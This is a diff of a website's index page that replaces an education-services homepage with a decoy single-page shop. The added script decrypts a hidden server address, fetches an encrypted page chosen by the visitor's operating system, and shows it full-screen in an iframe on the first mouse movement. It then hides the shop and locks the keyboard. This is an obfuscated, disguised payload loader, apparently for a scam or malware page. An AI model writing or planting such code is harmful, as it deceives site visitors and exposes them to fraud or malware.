@@ -1,425 +1,312 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>LessonLadder â€&quot; Adaptive Cognitive Pedagogy & Metacognitive Skill Ladders</title>
- <meta name="description" content="Elevate learning outcomes through cognitive load theory, spaced repetition algorithms, Socratic inquiry, and structured skill scaffolding at LessonLadder.">
- <link rel="canonical" href="https://lessonladder.com/">
- 
- <!-- Open Graph -->
- <meta property="og:title" content="LessonLadder â€&quot; Adaptive Cognitive Pedagogy Hub">
- <meta property="og:description" content="Metacognitive skill ladders, spaced repetition science, and interactive learning scaffolding.">
- <meta property="og:type" content="website">
- <meta property="og:url" content="https://lessonladder.com/">
- <meta property="og:image" content="https://lessonladder.com/images/hero-learning-ladder.jpg">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
- <!-- Stylesheet -->
- <link rel="stylesheet" href="style.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
 
- <!-- Google tag (gtag.js) -->
- <script async src="https://www.googletagmanager.com/gtag/js - id=G-0LY0HY7L01"></script>
- <script>
- window.dataLayer = window.dataLayer || [];
- function gtag(){dataLayer.push(arguments);}
- gtag('js', new Date());
- gtag('config', 'G-0LY0HY7L01');
- </script>
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
-<bo>
+<body>
 
- <div class="reading-progress-bar" aria-hidden="true"></div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
- <!-- Docked Top Utility Bar -->
- <aside class="edtech-utility-bar">
- <div class="container utility-flex">
- <div class="live-badge-status">
- <span class="status-ping"></span>
- <span>Adaptive Learning Engine Active: Ebbinghaus Spacing v4.2 Online</span>
- </div>
- <div class="utility-contact-links">
- <span>Location: 181 Mercer Street, New York, NY 10012</span>
- <a href="tel:+18887775845" style="color: var(--accent-emerald-light);">Tel: +1-888-777-5845</a>
- </div>
- </div>
- </aside>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
- <!-- Modern Floating Header -->
- <header class="edtech-header">
- <div class="container header-nav-wrapper">
- <a href="index.php" class="edtech-brand" aria-label="LessonLadder Home">
- <div class="ladder-icon-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 3v18M5 3v18M5 7h14M5 12h14M5 17h14"/></svg></div>
- <div class="brand-text-cluster">
- <span class="brand-title">LessonLadder</span>
- <span class="brand-tagline">Cognitive Pedagogy Hub</span>
- </div>
- </a>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
- <ul class="nav-links-menu">
- <li><a href="index.php" class="nav-item-link active">Console Home</a></li>
- <li><a href="about.html" class="nav-item-link">Pedagogy Lab</a></li>
- <li><a href="blog.html" class="nav-item-link">Research Journal</a></li>
- <li><a href="#workbench" class="nav-item-link">Skill Workbench</a></li>
- <li><a href="contact.html" class="nav-item-link">Institutional Advisory</a></li>
- </ul>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
 
- <div class="nav-cta-actions">
- <button class="theme-toggle-switch" aria-label="Toggle Interface Theme">Theme</button>
- <a href="contact.html" class="btn btn-emerald" style="padding: 0.45rem 1.15rem; font-size: 0.82rem;">Schedule Assessment</a>
- <button class="mobile-hamburger" aria-label="Open Navigation Menu">&#9776;</button>
- </div>
- </div>
- </header>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
 
- <main id="main-content">
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
- <!-- ðŸŒŸ SPLIT-SCREEN LEARNING CONSOLE HERO -->
- <section class="hero-console-section">
- <div class="container">
- <div class="hero-split-grid">
- 
- <!-- Left Column -->
- <div>
- <span class="badge badge-emerald">Evidence-Based Learning Science</span>
- <h1 class="hero-headline">Climb the Cognitive Ladder from <span class="gradient-word">Recall to Mastery</span></h1>
- <p class="hero-subtitle">
- LessonLadder architects precision pedagogical scaffolding. By harmonizing Sweller's Cognitive Load Theory, Ebbinghaus spaced intervals, and Vygotsky's Zone of Proximal Development, we transform passive stu into enduring conceptual breakthroughs.
- </p>
- <div class="hero-btn-row">
- <a href="#workbench" class="btn btn-emerald">Launch Skill Workbench</a>
- <a href="blog.html" class="btn btn-outline-console">Explore Pedagogical Research</a>
- </div>
 
- <div class="hero-stats-band">
- <div class="stat-box">
- <h4>94.8%</h4>
- <p>90-Day Retention</p>
- </div>
- <div class="stat-box">
- <h4>3.4x</h4>
- <p>Mastery Velocity</p>
- </div>
- <div class="stat-box">
- <h4>100%</h4>
- <p>Adaptive Scaffolding</p>
- </div>
- </div>
- </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
- <!-- Right Column: Interactive Console Dashboard Card -->
- <div>
- <div class="console-dashboard-card">
- <div class="console-header-tab">
- <div>
- <h3 style="font-size: 1.15rem; margin-bottom: 0.2rem;">Adaptive Skill Ladder Console</h3>
- <span class="badge badge-cobalt" style="font-size: 0.68rem;">Live Student Telemetry</span>
- </div>
- <span class="badge badge-emerald">Grade: Honors A+</span>
- </div>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19zuvqNStdWqLITaXcTbzzMIVzUdZfBezpGAYjWzoU4LxBTe6vV2KgX";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
- <div class="ladder-level-stack">
- <div class="ladder-tier-item active">
- <div class="tier-title-cluster">
- <h4>Rung 3: Metacognitive Synthesis & Critique</h4>
- <p>Evaluating complex multi-variable case proofs.</p>
- </div>
- <div class="progress-pill-bar">
- <div class="progress-pill-fill" style="width: 88%;"></div>
- </div>
- </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
- <div class="ladder-tier-item active">
- <div class="tier-title-cluster">
- <h4>Rung 2: Socratic Problem Solving & Schema Transfer</h4>
- <p>Cross-domain transfer & algorithmic modeling.</p>
- </div>
- <div class="progress-pill-bar">
- <div class="progress-pill-fill" style="width: 95%;"></div>
- </div>
- </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
- <div class="ladder-tier-item active">
- <div class="tier-title-cluster">
- <h4>Rung 1: Active Recall & Spaced Retrieval</h4>
- <p>Automated flash intervals & core lemma recall.</p>
- </div>
- <div class="progress-pill-bar">
- <div class="progress-pill-fill" style="width: 100%;"></div>
- </div>
- </div>
- </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
- <div style="margin-top: 1.5rem; padding: 0.85rem; background: var(--bg-surface-alt); border-radius: var(--radius-sm); font-size: 0.82rem; color: var(--text-muted); display: flex; justify-content: space-between;">
- <span>Cognitive Strain Index: <strong>Optimal (Zone 2)</strong></span>
- <span>Interval: <strong>Day 14 Review</strong></span>
- </div>
- </div>
- </div>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
- </div>
- </div>
- </section>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
- <!-- ðŸŒŸ SECTION 2: ADAPTIVE COGNITIVE LADDER MATRIX -->
- <section class="section-wrapper">
- <div class="container">
- <div class="section-head">
- <span class="badge badge-emerald">Curricular Hierarchy</span>
- <h2>The Tripartite Learning Ladder Architecture</h2>
- <p>Every lesson module is structured into three ascending pedagogical tiers, ensuring students never encounter extraneous cognitive friction.</p>
- </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
- <div class="ladder-matrix-grid">
- 
- <div class="ladder-matrix-card">
- <div class="matrix-rung-num">01</div>
- <h3>Foundational Schema Ingestion</h3>
- <p>
- Direct, dual-coded instruction breaking complex STEM and humanities concepts into bite-sized mental schemas. Minimizes split-attention effect and primes working memory for active retention.
- </p>
- </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
- <div class="ladder-matrix-card">
- <div class="matrix-rung-num">02</div>
- <h3>Deliberate Retrieval & Interleaving</h3>
- <p>
- Students practice active retrieval across interleaved problem types rather than repetitive block drills. Enforces neural consolidation and eliminates the illusion of explanatory depth.
- </p>
- </div>
-
- <div class="ladder-matrix-card">
- <div class="matrix-rung-num">03</div>
- <h3>Autonomous Metacognitive Mastery</h3>
- <p>
- Learners self-assess comprehension, critique alternative problem-solving pathways, and teach core principles via the Feynman technique, achieving unshakeable academic confidence.
- </p>
- </div>
-
- </div>
- </div>
- </section>
-
- <!-- ðŸŒŸ SECTION 3: METACOGNITIVE SKILL LADDER WORKBENCH (INTERACTIVE TOOL) -->
- <section id="workbench" class="section-wrapper" style="background: var(--bg-surface-alt); border-top: 1px solid var(--border-subtle); border-bottom: 1px solid var(--border-subtle);">
- <div class="container">
- <div class="section-head">
- <span class="badge badge-cobalt">Interactive Learning Simulator</span>
- <h2>Metacognitive Skill Ladder Workbench</h2>
- <p>Model how daily stu duration and spaced repetition intervals dictate long-term memory consolidation and cognitive efficiency.</p>
- </div>
-
- <div class="simulator-card-box">
- <div class="simulator-controls-row">
- <div class="sim-control">
- <label for="stu-time-slider">
- <span>Daily Deliberate Stu Time</span>
- <span id="stu-time-val" style="color: var(--accent-emerald); font-family: var(--font-mono);">60 Mins / Day</span>
- </label>
- <input type="range" id="stu-time-slider" min="15" max="180" step="5" value="60" aria-label="Daily Stu Time">
- </div>
-
- <div class="sim-control">
- <label for="spaced-interval-slider">
- <span>Spaced Repetition Review Gap</span>
- <span id="spaced-interval-val" style="color: var(--accent-emerald); font-family: var(--font-mono);">Every 7 Days</span>
- </label>
- <input type="range" id="spaced-interval-slider" min="1" max="30" step="1" value="7" aria-label="Spaced Interval Gap">
- </div>
- </div>
-
- <div class="sim-outputs-grid">
- <div class="sim-metric-cell">
- <h4>Predicted Long-Term Retention</h4>
- <p id="calc-retention">92% 90-Day Retention</p>
- </div>
-
- <div class="sim-metric-cell">
- <h4>Cognitive Load Efficiency</h4>
- <p id="calc-efficiency">88% Load Balance</p>
- </div>
-
- <div class="sim-metric-cell">
- <h4>Curricular Velocity</h4>
- <p id="calc-mastery">2.6x Mastery Speed</p>
- </div>
- </div>
-
- <div style="margin-top: 2rem; padding: 1rem 1.25rem; background: var(--bg-primary); border-radius: var(--radius-sm); border: 1px solid var(--border-subtle); font-size: 0.88rem; color: var(--text-muted);">
- ðŸ&#39;¡ <strong>Cognitive Scientist Insight:</strong> Spacing reviews across 7 to 14 day intervals prevents synaptic pruning, allowing long-term potentiation (LTP) in the hippocampus to cement abstract concepts without cramming exhaustion.
- </div>
- </div>
- </div>
- </section>
-
- <!-- ðŸŒŸ SECTION 4: BENTO PEDAGOGICAL RESEARCH LAB -->
- <section class="section-wrapper">
- <div class="container">
- <div class="section-head">
- <span class="badge badge-emerald">Evidence-Based Pillars</span>
- <h2>The Science Powering LessonLadder</h2>
- <p>Explore empirical cognitive frameworks validated by decades of peer-reviewed educational neuroscience.</p>
- </div>
-
- <div class="bento-lab-grid">
- 
- <div class="bento-lab-item">
- <div class="bento-media-frame">
- <img src="images/feature-spaced-repetition.jpg" alt="Student reviewing spaced repetition learning cards on notebook" width="800" height="500">
- </div>
- <div class="bento-text-pane">
- <span class="badge badge-emerald" style="margin-bottom: 0.5rem;">Memory namics</span>
- <h3>Ebbinghaus Forgetting Curve Interception</h3>
- <p>Automated review queues interrupt the natural decay of synaptic traces, transitioning working knowledge into durable crystal memory.</p>
- </div>
- </div>
-
- <div class="bento-lab-item">
- <div class="bento-media-frame">
- <img src="images/feature-socratic-tutoring.jpg" alt="Teacher engaged in Socratic pedagogical dialogue with student" width="800" height="500">
- </div>
- <div class="bento-text-pane">
- <span class="badge badge-cobalt" style="margin-bottom: 0.5rem;">Dialogic Inquiry</span>
- <h3>Socratic Guided Scaffolding</h3>
- <p>Rather than spoon-feeding answers, guided questioning prompts students to diagnose assumptions and synthesize first-principles proofs independently.</p>
- </div>
- </div>
-
- <div class="bento-lab-item">
- <div class="bento-media-frame">
- <img src="images/feature-stem-curriculum.jpg" alt="Interactive STEM educational tools and geometric learning models" width="800" height="500">
- </div>
- <div class="bento-text-pane">
- <span class="badge badge-emerald" style="margin-bottom: 0.5rem;">Dual Coding</span>
- <h3>Paivio Visual-Verbal Integration</h3>
- <p>Simultaneous processing of schematic infographics and verbal explanations creates dual retrieval pathways, doubling retention efficiency.</p>
- </div>
- </div>
-
- </div>
- </div>
- </section>
-
- <!-- ðŸŒŸ SECTION 5: ACCORDION KNOWLEDGE VAULT -->
- <section class="section-wrapper" style="background: var(--bg-surface-alt);">
- <div class="container">
- <div class="section-head">
- <span class="badge badge-cobalt">Pedagogical FAQ</span>
- <h2>Frequently Asked Questions on Adaptive Learning</h2>
- <p>How LessonLadder empowers K-12 students, university researchers, and corporate educators.</p>
- </div>
-
- <div class="accordion-wrapper">
- 
- <div class="accordion-item active">
- <button class="accordion-trigger">
- <span>How does LessonLadder prevent student cognitive burnout during challenging STEM subjects - </span>
- <span class="toggle-icon">+</span>
- </button>
- <div class="accordion-content">
- LessonLadder namically monitors task completion latency and error patterns. When intrinsic cognitive load peaks, the system activates metacognitive micro-scaffoldingâ€&quot;breaking complex multi-step calculus or physics proofs into intermediate lemmasâ€&quot;keeping learners strictly within Vygotsky's Zone of Proximal Development without inducing mental fatigue.
- </div>
- </div>
-
- <div class="accordion-item">
- <button class="accordion-trigger">
- <span>Why is spaced retrieval superior to traditional blocked practice and re-reading - </span>
- <span class="toggle-icon">+</span>
- </button>
- <div class="accordion-content">
- Empirical cognitive research demonstrates that passive re-reading creates a deceptive "illusion of competence." In contrast, effortful active retrieval forces the brain to rebuild neural pathways, triggering synaptic consolidation and long-term potentiation (LTP) that yields up to 300% greater retention on cumulative examinations.
- </div>
- </div>
-
- <div class="accordion-item">
- <button class="accordion-trigger">
- <span>Can institutions customize the LessonLadder curriculum to state or IB standards - </span>
- <span class="toggle-icon">+</span>
- </button>
- <div class="accordion-content">
- Yes. LessonLadder offers complete curricular alignment mapping across AP, International Baccalaureate (IB), Common Core, and university-level accreditation frameworks, allowing faculty to upload bespoke rubric trees and automate formative progress telemetry.
- </div>
- </div>
-
- <div class="accordion-item">
- <button class="accordion-trigger">
- <span>What diagnostic metrics are provided to teachers and academic advisors - </span>
- <span class="toggle-icon">+</span>
- </button>
- <div class="accordion-content">
- Educators receive real-time dashboards displaying Bloom's Taxonomy distribution, schema mastery depth, average retrieval latency, and automated alerts for students encountering conceptual bottlenecks before summative assessments occur.
- </div>
- </div>
-
- </div>
- </div>
- </section>
-
- </main>
-
- <!-- ðŸŒŸ MODERN EDTECH FOOTER -->
- <footer class="site-footer">
- <div class="container">
- <div class="footer-main-grid">
- <div class="footer-brand-info">
- <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.75rem;">
- <span style="display:inline-flex;align-items:center;color:var(--accent-emerald);"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 3v18M5 3v18M5 7h14M5 12h14M5 17h14"/></svg></span>
- <span style="font-family: var(--font-display); font-size: 1.35rem; font-weight: 800; color: #ffffff;">LessonLadder</span>
- </div>
- <p>
- An adaptive cognitive pedagogy laboratory and research institute dedicated to evidence-based learning science, spaced memory consolidation, and metacognitive curriculum scaffolding.
- </p>
- </div>
-
- <div class="footer-links-col">
- <h4>Pedagogy Navigation</h4>
- <ul>
- <li><a href="index.php">Console Home</a></li>
- <li><a href="about.html">Pedagogy Lab</a></li>
- <li><a href="blog.html">Research Journal</a></li>
- <li><a href="#workbench">Skill Workbench</a></li>
- <li><a href="contact.html">Institutional Advisory</a></li>
- </ul>
- </div>
-
- <div class="footer-links-col">
- <h4>Governance & Trust</h4>
- <ul>
- <li><a href="privacy.html">Privacy Policy</a></li>
- <li><a href="terms.html">Terms of Service</a></li>
- <li><a href="disclaimer.html">Educational Disclaimer</a></li>
- <li><a href="cookies.html">Cookie Policy</a></li>
- </ul>
- </div>
-
- <div class="footer-links-col">
- <h4>Academic Headquarters</h4>
- <p style="font-size: 0.88rem; line-height: 1.6; color: #9ca3af;">
- <strong>Learning Research Lab:</strong><br>
- 181 Mercer Street,<br>
- New York, NY 10012,<br>
- United States
- </p>
- <p style="margin-top: 0.75rem; font-size: 0.88rem;">
- <strong>Academic Concierge:</strong><br>
- <a href="tel:+18887775845" style="color: var(--accent-emerald-light);">Tel: +1-888-777-5845</a>
- </p>
- </div>
- </div>
-
- <div class="footer-bottom-strip">
- <div>
- &copy; < - php echo date('Y'); - > LessonLadder Institute. All rights reserved. Empowering cognitive mastery.
- </div>
- <div class="footer-sub-links">
- <a href="privacy.html">Privacy</a>
- <a href="terms.html">Terms</a>
- <a href="disclaimer.html">Disclaimer</a>
- <a href="cookies.html">Cookies</a>
- </div>
- </div>
- </div>
- </footer>
-
- <script src="script.js"></script>
-</bo>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
 </html>
